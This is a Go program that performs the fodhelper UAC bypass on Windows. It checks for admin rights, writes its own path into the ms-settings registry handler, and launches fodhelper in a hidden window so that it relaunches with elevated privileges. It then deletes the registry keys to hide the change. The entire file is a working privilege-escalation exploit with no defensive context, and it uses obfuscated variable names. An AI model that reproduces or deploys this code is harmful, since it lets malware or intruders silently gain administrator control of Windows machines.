package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func main() {
	fmt.Println("start")
	elvStatus()
}

func elvStatus() {
	fmt.Println("checkin elev status")
	mak := exec.Command("net", "session")
	mak.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	jasht, err := mak.CombinedOutput()
	if err != nil { // not elevated, let's perform bypass.
		fmt.Println("not elevated")
		fmt.Println(jasht)
		tipilepstev()
	}

	doWhatever()

}

func tipilepstev() { // perfrom bypass
	fmt.Println("performing bypass")
	qlcc, _, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\ms-settings\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil {
		fmt.Println(err)
	}
	defer qlcc.Close()

	// self
	vlera, err := os.Executable()
	if err != nil {
		fmt.Println(err)
	}

	if err = qlcc.SetStringValue("", vlera); err != nil {
		fmt.Println(err)
	}
	if err = qlcc.SetStringValue("DelegateExecute", ""); err != nil {
		fmt.Println(err)
	}

	komanddo := exec.Command("cmd.exe", "/C", "fodhelper")
	komanddo.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = komanddo.Run()
	if err != nil {
		fmt.Println(err)
	}

	err = qlcc.DeleteValue("")
	if err != nil {
		fmt.Println(err)
	}

	err = qlcc.DeleteValue("DelegateExecute")
	if err != nil {
		fmt.Println(err)
	}

	os.Exit(0)

}

func doWhatever() {
	fmt.Println("showing")
	show := exec.Command("whoami", "/priv")

	out, err := show.CombinedOutput()
	if err != nil {
		fmt.Printf("err: %v\n", err)
		fmt.Printf("out: %s\n", string(out))
	}
	fmt.Printf("out: %s\n", string(out))

	time.Sleep(10 * time.Second)

}
